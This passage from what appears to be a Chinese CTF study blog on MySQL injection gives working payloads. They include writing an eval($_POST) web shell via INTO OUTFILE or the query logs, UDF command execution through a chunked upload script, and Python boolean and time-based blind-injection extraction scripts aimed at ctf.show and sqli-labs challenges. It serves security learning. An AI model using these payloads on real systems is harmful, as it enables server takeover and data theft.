<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[0]);'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/shell.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>getshell的具体操作：<a href="https://c1oudfl0w0.github.io/blog/2023/05/23/MySQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0getshell/">https://c1oudfl0w0.github.io/blog/2023/05/23/MySQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0getshell/</a></p>
<hr>
<h2 id="UDF注入"><a href="#UDF注入" class="headerlink" title="UDF注入"></a>UDF注入</h2><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#UDF-%E6%8F%90%E6%9D%83">参考国光大佬的博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/125220318?ops_request_misc=&request_id=4ebaa5cb9e74494eb60062c40617ff22&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-3-125220318-null-null.268%5Ev1%5Econtrol&utm_term=sql&spm=1018.2226.3001.4450">参考羽师傅的博客</a></p>
<p>udf 全称为：user defined function，意为用户自定义函数</p>
<p>用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 <code>contact()</code>，<code>user()</code>，<code>version()</code>等函数</p>
<p>写入位置：<code>/usr/lib/MySQL目录/plugin</code></p>
<p>具体步骤：</p>
<ol>
<li><p>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib&#x2F;plugin文件夹下），udf文件可以从sqlmap里面扒，也可以在国光的博客里面扒<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a>，一般选 lib_mysqludf_sys_64.so 就可以了</p>
</li>
<li><p>从udf文件中引入自定义函数(user defined function)</p>
</li>
<li><p>执行自定义函数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'hack.so'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="ctfshow-web248"><a href="#ctfshow-web248" class="headerlink" title="ctfshow web248"></a>ctfshow web248</h3><p>因为get请求有长度限制，所以这里得分段来传</p>
<p>把国光博客里的payload中0x后面的16进制值填到下面脚本的udf变量中就可以了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://17c12732-3a13-4af4-8750-f614f00d0519.challenge.ctf.show/api/"</span>
udf<span class="token operator">=</span><span class="token string">""</span>
udfs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>udf<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    udfs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#写入多个文件中</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> udfs<span class="token punctuation">:</span>
    url1<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"?id=1';SELECT '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">' into dumpfile '/tmp/"</span></span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>udfs<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">".txt'%23"</span>
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>

<span class="token comment">#合并文件生成so文件</span>
url2<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?id=1';SELECT unhex(concat(load_file('/tmp/0.txt'),load_file('/tmp/1.txt'),load_file('/tmp/2.txt'),load_file('/tmp/3.txt'))) into dumpfile '/usr/lib/mariadb/plugin/hack.so'%23"</span>
requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>

<span class="token comment">#创建自定义函数并执行恶意命令</span>
requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?id=1';create function sys_eval returns string soname 'hack.so'%23"</span><span class="token punctuation">)</span>
r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?id=1';select sys_eval('cat /f*')%23"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="全局日志-x2F-慢查询日志"><a href="#全局日志-x2F-慢查询日志" class="headerlink" title="全局日志&#x2F;慢查询日志"></a>全局日志&#x2F;慢查询日志</h2><p>通过开启慢查询日志，配置可解析日志文件 getshell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow%'</span><span class="token punctuation">;</span>
<span class="token keyword">set</span> <span class="token keyword">GLOBAL</span> slow_query_log_file<span class="token operator">=</span><span class="token string">'/var/www/html/slow.php'</span><span class="token punctuation">;</span>
<span class="token keyword">set</span> <span class="token keyword">GLOBAL</span> slow_query_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span>
<span class="token keyword">set</span> <span class="token keyword">GLOBAL</span> log_queries_not_using_indexes<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?>'</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>db <span class="token keyword">where</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后访问日志php文件即可</p>
<p>全局日志也是同样的操作</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%general%'</span><span class="token punctuation">;</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">"/var/www/html/test.php"</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token string">"&lt;?php @eval($_POST['cmd']); ?>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是大多数情况这个文件访问过去都是 403 forbidden</p>
<hr>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><blockquote>
<p>SQL语句执行查询后，查询数据不能直接回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，逐位爆破出我们需要的值，这个过程称为盲注</p>
</blockquote>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>适用于页面有回显，可以判断查询是否成功的情况</p>
<h3 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
<li><p><code>if</code>函数</p>
<blockquote>
<p>在 MySQL 中，IF() 是一个条件函数，用于根据给定的条件返回不同的值</p>
</blockquote>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span><span class="token punctuation">(</span>condition<span class="token punctuation">,</span> true_value<span class="token punctuation">,</span> false_value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>  condition: 一个表达式，返回 TRUE 或 FALSE</p>
<p>  true_value: 如果 condition为 TRUE 时返回的值</p>
<p>  false_value: 如果 condition为 FALSE 时返回的值</p>
<ul>
<li><p><code>substr</code> &#x2F; <code>substring</code> 函数</p>
<blockquote>
<p>字符串处理函数，用于从指定字符串中提取部分子字符串。它通过指定起始位置和长度来完成提取操作</p>
</blockquote>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SUBSTR<span class="token punctuation">(</span>string<span class="token punctuation">,</span> position<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>  string：要操作的字符串。</p>
<p>  position：开始提取的字符位置（索引从 1 开始）。可以是正数或负数</p>
<p>  length（可选）：要提取的子字符串的长度。如果省略，则从起始位置提取到字符串末尾</p>
<p>  类似的函数：<code>left()</code>、<code>right()</code>、<code>mid()</code></p>
<ul>
<li><p><code>length</code> 函数</p>
<blockquote>
<p>字符串函数，用于计算字符串的长度（以字节为单位）</p>
</blockquote>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">LENGTH<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h3 id="判断回显"><a href="#判断回显" class="headerlink" title="判断回显"></a>判断回显</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'and if(1>0,1,0)#
1'</span><span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416173256122.png" alt="image-20250416173256122"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416173308510.png" alt="image-20250416173308510"></p>
<p>同或判断：如果过滤了大于号和小于号可以考虑用这个</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">!=</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>同或逻辑：<code>1 !=! 1 == 1</code>，<code>1 !=! 0 == 0</code>，<code>0 !=! 1 == 0</code>，<code>0 !=! 0 == 1</code></p>
</blockquote>
<p>回显到前端一般会体现为查询成功与查询失败</p>
<p>然后我们要做的是在 if 方法里添加子查询，判断查询的结果是否正确</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 假设数据库名为sql</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 返回1</span>
<span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span> <span class="token comment">-- 返回1</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 所以这个判断语句也返回1</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 返回0</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"q"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 返回1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由此，遍历 substr() 的 position 和匹配的字符，可以得到整个字段的内容</p>
<p>可以使用 burpsuite 分别设置两个fuzz点爆破，也可以搓 python 脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string

chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">"&#123;&#125;-,"</span>  <span class="token comment"># abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-,</span>

<span class="token keyword">def</span> <span class="token function">boolean_blind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'select if(substr(database(),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",1,0);'</span></span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

boolean_blind<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="sqli-labs-less-8"><a href="#sqli-labs-less-8" class="headerlink" title="sqli-labs less-8"></a>sqli-labs less-8</h3><p>ctfshow web524</p>
<p>测试发现正常传入 id&#x3D;1 返回<code>You are in...........</code>，但是 id 过大或为负数时，即查询不到就没有回显</p>
<p><code>1&#39; </code>闭合也没有回显</p>
<p>测试是否存在布尔盲注</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'and if(1>0,1,0)--+
-- 返回You are in...........

1'</span><span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+</span>
<span class="token comment">-- 无回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>说明闭合方式为 <code>1&#39;</code>，且存在查询成功的判断依据可以进行布尔盲注</p>
<p>据此搓一个 python 脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> requests

chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">"&#123;&#125;-,"</span>  <span class="token comment"># abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-,</span>

<span class="token keyword">def</span> <span class="token function">boolean_blind</span><span class="token punctuation">(</span>close_method<span class="token punctuation">,</span>url<span class="token punctuation">,</span>query<span class="token punctuation">,</span>judge<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
            payload1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr(database(),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",1,0)--+'</span></span>
            payload2 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(SCHEMA_NAME) from information_schema.SCHEMATA),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",1,0)--+'</span></span>
            payload3 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(table_name) from information_schema.tables where table_schema="ctfshow"),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",1,0)--+'</span></span>
            payload4 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(column_name) from information_schema.columns where table_schema="ctfshow" and table_name="flagjugg"),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",1,0)--+'</span></span>
            payload5 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(flag423) from ctfshow.flagjugg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",1,0)--+'</span></span>
            last_payload <span class="token operator">=</span> close_method <span class="token operator">+</span> payload5
            send_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">+</span>query <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> last_payload
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>send_url<span class="token punctuation">)</span>
            temp <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">if</span> judge <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                result <span class="token operator">+=</span> c
                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                temp <span class="token operator">=</span> <span class="token number">0</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"End"</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


boolean_blind<span class="token punctuation">(</span><span class="token string">"1'"</span><span class="token punctuation">,</span><span class="token string">"http://3d03953b-9cda-476f-8b1d-0a00bce950c2.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">,</span><span class="token string">"You are in..........."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>更多内容请前往：<a href="https://c1oudfl0w0.github.io/blog/2023/05/06/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">https://c1oudfl0w0.github.io/blog/2023/05/06/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</a></p>
<hr>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>相较于布尔盲注，时间盲注无非是把查询成功的表现变成了<code>sleep</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'1'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a href="/blog/2023/05/10/SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">更多内容请前往</a></p>
<hr>
<h3 id="sqli-labs-less-9-amp-10"><a href="#sqli-labs-less-9-amp-10" class="headerlink" title="sqli-labs less-9&amp;10"></a>sqli-labs less-9&amp;10</h3><p>ctfshow web525&amp;526</p>
<p>测试发现无论输入什么内容都只会回显<code>You are in...........</code></p>
<p>那只能时间盲注了</p>
<p>构造脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">"&#123;&#125;-,"</span>  <span class="token comment"># abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-,</span>

<span class="token keyword">def</span> <span class="token function">time_blind</span><span class="token punctuation">(</span>close_method<span class="token punctuation">,</span>url<span class="token punctuation">,</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
            payload1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr(database(),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),1)--+'</span></span>
            payload2 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(SCHEMA_NAME) from information_schema.SCHEMATA),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),1)--+'</span></span>
            payload3 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(table_name) from information_schema.tables where table_schema="ctfshow"),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),1)--+'</span></span>
            payload4 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(column_name) from information_schema.columns where table_schema="ctfshow" and table_name="flagug"),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),1)--+'</span></span>
            payload5 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'and if(substr((select GROUP_CONCAT(flag4a23) from ctfshow.flagug),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),1)--+'</span></span>
            last_payload <span class="token operator">=</span> close_method <span class="token operator">+</span> payload5
            send_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">+</span>query <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> last_payload
            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>send_url<span class="token punctuation">)</span>
            end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            spend_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
            temp <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">if</span> spend_time <span class="token operator">>=</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
                result <span class="token operator">+=</span> c
                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                temp <span class="token operator">=</span> <span class="token number">0</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"End"</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

time_blind<span class="token punctuation">(</span><span class="token string">"1'"</span><span class="token punctuation">,</span><span class="token string">"http://46eadf54-e7ea-42be-8e76-b950f134f342.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>less 10是双引号闭合</p>
<hr>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><blockquote>
<p>已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p>
</blockquote>
<p>场景：创建用户处具有严格的 sql 防护（如转义），但是用户修改密码处缺少防护，当修改密码处从数据库取出精心构造的用户名时可能导致注入</p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5</a></p>
<h2 id="sqli-labs-less-24"><a href="#sqli-labs-less-24" class="headerlink" title="sqli-labs less-24"></a>sqli-labs less-24</h2><p>ctfshow web540</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250418002654967.png" alt="image-20250418002654967"></p>
<p>直接看 sqli-labs 的源码</p>
<p>创建用户与登录的语句：</p>
